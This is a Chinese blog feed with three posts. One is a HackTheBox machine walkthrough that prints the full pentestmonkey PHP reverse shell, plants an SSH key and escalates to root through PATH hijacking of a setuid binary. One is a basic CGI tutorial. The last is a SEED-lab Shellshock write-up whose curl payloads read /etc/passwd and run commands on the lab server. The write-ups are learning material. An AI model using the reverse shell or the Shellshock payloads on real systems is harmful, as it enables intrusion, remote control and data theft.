to</span></span><br><span class="line"><span class="comment">// you, then do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment">// me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Description</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment">// The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Limitations</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></span><br><span class="line"><span class="comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></span><br><span class="line"><span class="comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">// Fork and have the parent process exit</span></span><br><span class="line"><span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the current process a session leader</span></span><br><span class="line"><span class="comment">// Will only succeed if we forked</span></span><br><span class="line"><span class="keyword">if</span> (posix_setsid() == -<span class="number">1</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Check for end of TCP connection</span></span><br><span class="line"><span class="keyword">if</span> (feof(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for end of STDOUT</span></span><br><span class="line"><span class="keyword">if</span> (feof(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="variable">$num_changed_sockets</span> = stream_select(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div></div>我们只需要改变ip和所监听的端口即可，之后上传并访问该文件，我们便可以得到matt用户的shell。<h2 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h2><code>find / -perm -u=s 2&gt; /dev/null</code>：找到主机上面具有setuid权限的文件。<br><img src="https://s2.loli.net/2022/01/31/k46yLFl5ozcUmuT.png" alt="image.png"><br>发现<code>/usr/bin/pandora_backup</code>是用来进行备份的可执行文件，运行一下。直接运行<code>sudo /usr/bin/pandora_backup</code>发现报错，查看别人文章说是shell的问题，可以通过ssh获取一个更加稳定的shell。<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><code>ssh-keygen</code>：创建公钥和私钥，passphrase可以不输入直接Enter不设置密码。<br><code>cat id_rsa.pub &gt;&gt; authorized_keys</code>：将生成的公钥加入到授权登录的列表里面。<br><code>chmod 600 authorized_keys</code>：更改权限。<br>在自己的主机上执行如下步骤：<br><code>touch id_rsa</code>：将该密钥放入到本地的一个文件中，作者创建了<em>id_rsa</em>。<br><code>chmod 600 id_rsa</code>：更改权限。<br><code>ssh matt@10.10.11.136 -i ./id_rsa</code>：通过本地<em>id_rsa</em>密钥文件以matt身份登录。<h3 id="setuid文件的利用"><a href="#setuid文件的利用" class="headerlink" title="setuid文件的利用"></a>setuid文件的利用</h3><code>python3 -m http.server 18000</code>在靶机上开启一个服务器，来把<em>pandora_backup</em>文件下载到本地进行调试。<br><code>gdb ./pandora_backup</code>启动调试。<br><img src="https://s2.loli.net/2022/01/31/65QloRWtiT1xKcn.png" alt="image.png"><br>发现调用了tar进行备份，所以我们可以在环境变量中插入我们自己的tar可执行文件路径。<br><code>echo &quot;/bin/bash&quot; &gt; tar</code><br><code>chmod +x ./tar</code><br><code>PATH=&quot;/home/matt&quot;:$&#123;PATH&#125;</code>：将我们的tar可执行文件的路径作为最先匹配的路径，命令的匹配是按环境变量所包含路径的顺序查找的。<br>最后执行<code>/usr/bin/pandora_backup</code>便可以获得root shell。<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><a href="https://zhuanlan.zhihu.com/p/458926451">https://zhuanlan.zhihu.com/p/458926451</a><br><a href="https://brainful.blog/2022/01/19/enumeration-2/">https://brainful.blog/2022/01/19/enumeration-2/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> Hackthebox </category>
          
          <category> easy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CGI学习</title>
      <link href="/2022/01/23/CGI%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/CGI%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CGI(Common Gateway Interface)严格来说是一个协议标准，不管是什么编程语言，只要符合该标准的规则就可以被称为CGI程序或者CGI脚本。<br>CGI是为Web服务器产生动态内容而创造的。在该标准出现前服务器所提供的都是静态内容，也就是存储在磁盘上面的文件，服务器在收到请求后直接将磁盘文件内容发送给客户端。而CGI出现之后，服务器就可以与后端的数据库进行交互。</p><h1 id="CGI工作原理"><a href="#CGI工作原理" class="headerlink" title="CGI工作原理"></a>CGI工作原理</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  flowchart TB    浏览器--HTTP请求&#x2F;cgi-bin&#x2F;hello.py--&gt;B[服务器]    B--HTTP响应--&gt;浏览器    B--调用并传递参数--&gt;C[CGI程序]    C--返回执行结果--&gt;B    C--请求--&gt;D[数据库]    D--响应--&gt;C  </pre></div><p>首先通过向浏览器中输入URL来向服务器请求CGI程序并传入参数。服务器在知道客户端要访问CGI程序后，会先fork一个新的shell进程然后运行/cgi-bin/hello.py这个CGI程序，CGI程序可以与后端的数据库进行一些交互并将最终的结果返回给服务器，服务器再发送给客户端。<br>这是一个大致的工作流程，但是其中有几个问题需要解决。服务器如何将参数传递给子进程？服务器如何将其他信息传递给子进程?CGI的执行结果如何返回给客户端？</p><ol><li>服务器会将URL后面跟随的参数赋值给环境变量<code>QUERY_STRING</code>，环境变量会传递给子进程，这样子进程便也可以访问传进来的参数。</li><li>服务器其他的一些信息，比如监听的端口、客户端IP地址等，同样的也会赋值给相应的环境变量并传递给子进程。</li><li>在子进程加载并运行CGI程序前，服务器会将标准输出重定向到与客户端相关联的套接字描述符，这样就会将输出的内容发送给客户端。需要注意的一点是，内容类型<code>Content-type</code>和长度<code>Content-length</code>都需要子进程来进行设置。<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2>接下来通过一个Apache服务器的例子来进一步说明工作的原理。<h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">apache:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">httpd:2.4</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;18008:80&quot;</span></span><br><span class="line">        <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;./:/tmp&quot;</span></span><br></pre></td></tr></table></figure><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3>开启Apache服务器的CGI，修改apache的配置文件conf目录下的httpd.conf。</li></ol><ul><li>注释掉<code>LoadModule cgid_module modules/mod_cgid.so</code>来加载CGI模块。</li><li><code>ScriptAlias &quot;/cgi-bin/&quot; &quot;/usr/local/apache2/cgi-bin/&quot;</code>将存放CGI程序的目录与URL访问路径映射起来，每当访问该路径时，服务器就会将所访问的文件视为CGI程序并尝试去执行。</li><li><code>AddHandler cgi-script .cgi .py</code>除了告诉服务器CGI程序存放的目录外，还要告诉服务器什么后缀的文件也应该被视为CGI程序。</li><li>在服务器目录下执行<code>bin/apachectl restart</code>来重启服务器加载配置文件。<br>更多的配置信息可以参考<a href="https://httpd.apache.org/docs/2.4/howto/cgi.html">官方链接</a><h3 id="CGI程序"><a href="#CGI程序" class="headerlink" title="CGI程序"></a>CGI程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;h1&gt;Hello from server!&lt;h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>C语言编写的一个简单的CGI程序。与之前描述的一样，我们需要先设置必要的部分，这里设置了MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展类型）为html，并且按照格式以一个新的空行标志响应报头的结束，后面跟上响应主体也就是我们想要发送的信息。<h3 id="访问CGI程序"><a href="#访问CGI程序" class="headerlink" title="访问CGI程序"></a>访问CGI程序</h3>浏览器输入<code>http://ip:18008/cgi-bin/hello</code>来访问编译好的CGI程序。<br><img src="https://s2.loli.net/2022/01/25/DuIAoMG9CQlOT71.png" alt="image.png"><br>服务器成功地返回了信息。<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1>CGI是一个很古远的技术了，现在的前后端界限已经没有那么清晰了，比如Node.js是一个基于JavaScript的运行时环境而JavaScript本身属于前端语言的范畴。但是学习一下CGI可以帮助我们理解前后端以及Web服务器之间是如何进行交互的，这样当我们在学习一些更加复杂的技术时可以帮助我们更快的入门。<br>接下来计划继续完善该文章，介绍一些CGI的改进版本。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础原理 </category>
          
          <category> Web服务器 </category>
          
          <category> CGI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGI </tag>
            
            <tag> 动态内容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seedlab-Shellshock</title>
      <link href="/2022/01/23/shellshock/"/>
      <url>/2022/01/23/shellshock/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Shellshock是于2014年发现与bash相关的漏洞，漏洞原因是因为bash在解析函数变量时所调用的解析函数，会将<strong>分号</strong>隔开的语句当作指令而执行，从而造成命令执行。<br><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/">本实验原地址</a></p><h1 id="Web服务器与CGI"><a href="#Web服务器与CGI" class="headerlink" title="Web服务器与CGI"></a>Web服务器与CGI</h1><p>许多的Web服务器（Apache和nginx等）开启了CGI，来为web应用生成动态的内容。许多的CGI程序是shell脚本，所以在CGI程序运行前，Web服务器会首先fork一个新的shell程序并将HTTP请求中的一些内容设置为环境变量引入，需要用户进行HTTP请求来触发该CGI程序。<br>需要补充一点的是，CGI程序不仅可以是shell脚本，其他的一些可以接收输入的编程语言比如php等，也可以作为CGI程序来进行解析。</p><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><h2 id="熟悉shell函数"><a href="#熟悉shell函数" class="headerlink" title="熟悉shell函数"></a>熟悉shell函数</h2><p>Ubuntu20.04中的bash程序已经被修复，无法再实施攻击。该实验在虚拟机的<mark class="hl-label blue">/bin</mark> 和压缩包的<mark class="hl-label blue">image_www</mark> 目录下安装了一个存在漏洞的bash程序。</p><h3 id="编写一个存在漏洞的shell函数"><a href="#编写一个存在漏洞的shell函数" class="headerlink" title="编写一个存在漏洞的shell函数"></a>编写一个存在漏洞的shell函数</h3><p>正常情况下shell函数的编写：<br><code>foo() &#123; echo &quot;hello world!&quot;; &#125;</code></p><mark class="hl-label red">注意：</mark> 左大括号后面的空格不能丢。<p><code>declare -f foo</code>来输出定义的函数<br>通过直接在shell中输入函数名字即可调用。<br><code>unset -f foo</code>删除定义的函数<br>另一种shell函数的编写方法：<br>上一种方法编写的shell函数如果想要传入子进程,则需要执行<code>export -f foo</code>,也就是将export的函数定义作为环境变量传入子进程。这种方法的缺点就是，父进程必须是shell程序否则无法将函数转化为环境变量引入子进程。<br>还有一种方法是定义一个特殊的变量，如<code>foo=&#39;() &#123; echo &quot;hello world!&quot;; &#125;&#39;</code>，<strong>左大括号左右间的空格不能丢掉</strong>。然后将该变量作为环境变量引入子bash进程<code>export foo</code>，子进程的shell程序会将环境变量转换为它自己的shell变量，如果在转换过程中发现有以<code>() &#123;</code>开头的环境变量时，则会将其转换为shell函数。这样只需要通过一个环境变量即可以传递函数定义。<br>定义一个存在漏洞的shell函数：<br>第二种方法在将环境变量解析为函数时会解析并执行<code>;</code>分隔的shell命令。<br><code>hack=&#39;() &#123; echo &quot;bad shell func!;&quot;&#125;;echo &quot;hacker!\n&quot;&#39;</code><strong>注意分号</strong><br><img src="https://s2.loli.net/2022/01/22/MxNuOp7ef8QKFqD.png" alt="image.png"><br>不同bash的结果如上图所示。</p><h2 id="通过环境变量向bash传入数据"><a href="#通过环境变量向bash传入数据" class="headerlink" title="通过环境变量向bash传入数据"></a>通过环境变量向bash传入数据</h2><div class="note primary simple"><p>Shellshock如果需要成功，需要满足以下两个条件：<br>1.触发bash调用<br>2.将用户输入作为环境变量</p></div><p>方便查看环境变量的CGI程序<mark class="hl-label blue">getenv.cgi</mark> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash_shellshock</span><br><span class="line"></span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;****** Environment Variables ******&quot;</span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure><p><code>$$</code>会被替换为当前的进程ID</p><h3 id="使用浏览器"><a href="#使用浏览器" class="headerlink" title="使用浏览器"></a>使用浏览器</h3><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器返回内容</span></div>    <div class="hide-content"><p>****** Environment Variables ******<br>HTTP_HOST=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0<br>HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5<br>HTTP_ACCEPT_ENCODING=gzip, deflate<br>HTTP_CONNECTION=keep-alive<br>HTTP_UPGRADE_INSECURE_REQUESTS=1<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at <a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a> Port 80</address><br>SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)<br>SERVER_NAME=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>SERVER_ADDR=10.9.0.80<br>SERVER_PORT=80<br>REMOTE_ADDR=10.9.0.1<br>DOCUMENT_ROOT=/var/www/html<br>REQUEST_SCHEME=http<br>CONTEXT_PREFIX=/cgi-bin/<br>CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/<br>SERVER_ADMIN=webmaster@localhost<br>SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi<br>REMOTE_PORT=45228<br>GATEWAY_INTERFACE=CGI/1.1<br>SERVER_PROTOCOL=HTTP/1.1<br>REQUEST_METHOD=GET<br>QUERY_STRING=<br>REQUEST_URI=/cgi-bin/getenv.cgi<br>SCRIPT_NAME=/cgi-bin/getenv.cgi</p></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器可传入的环境变量</span></div>    <div class="hide-content"><ul><li>HTTP_USER_AGENT</li><li>HTTP_ACCEPT</li><li>HTTP_ACCEPT_LANGUAGE</li><li>HTTP_ACCEPT_ENCODING</li><li>HTTP_HOST</li><li>HTTP_CONNECTION</li><li>HTTP_UPGRADE_INSECURE_REQUESTS</li></ul></div></div><h3 id="使用curl"><a href="#使用curl" class="headerlink" title="使用curl"></a>使用curl</h3><ul><li><code>-A</code>改变User-Agent字段</li><li><code>-e</code>改变Referer字段</li><li><code>-H</code>自定义头部，无值<code>Extra-Header;</code>,有值<code>Extra-Header: value</code><br>上面的三个选项均可以用来向环境变量中注入数据。<h2 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h2>目标URL：<a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a><br>如果攻击命令执行结果是一个纯文本输出，并且我们想要该结果返回，则需要满足该协议：首先要以<code>echo &quot;Content-type: text/plain&quot;;</code>开头，后面跟随着一个空白行<code>echo;</code>，最后是我们想要执行的指令。<br>比如：<code>echo &quot;Content-type: text/plain&quot;;echo;/bin/ls -l</code><h3 id="服务器返回-etc-passwd的内容"><a href="#服务器返回-etc-passwd的内容" class="headerlink" title="服务器返回/etc/passwd的内容"></a>服务器返回/etc/passwd的内容</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/cat /etc/passwd&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="服务器返回当前的User-ID"><a href="#服务器返回当前的User-ID" class="headerlink" title="服务器返回当前的User ID"></a>服务器返回当前的User ID</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/id&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="在-tmp目录下创建新的文件"><a href="#在-tmp目录下创建新的文件" class="headerlink" title="在/tmp目录下创建新的文件"></a>在/tmp目录下创建新的文件</h3>使用-A选项<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/touch /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>查看创建的文件：<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/ls /tmp -l&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></li></ul><mark class="hl-label red">注意：</mark> 一次只能执行一个命令<h3 id="删除创建的文件"><a href="#删除创建的文件" class="headerlink" 